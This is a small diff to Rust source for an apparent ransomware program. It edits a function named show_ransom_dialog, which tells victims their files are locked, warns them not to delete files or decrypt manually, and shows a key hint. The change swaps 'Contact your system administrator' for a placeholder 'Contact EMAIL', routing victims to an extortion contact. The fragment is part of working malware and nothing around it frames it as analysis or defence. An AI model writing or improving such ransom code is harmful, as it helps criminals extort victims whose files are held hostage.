@@ -18,7 +18,7 @@ pub fn show_ransom_dialog(key_hint: &str) -> Result<(), String> {
          ❌ DO NOT delete any files\n\
          ❌ DO NOT attempt to decrypt manually\n\n\
          Your files can be recovered with the correct decryption key.\n\
-         Contact your system administrator for assistance.",
+         Contact EMAIL for assistance.",
         &key_hint[..16.min(key_hint.len())]
     );
     let message = wide_string(&message_text);
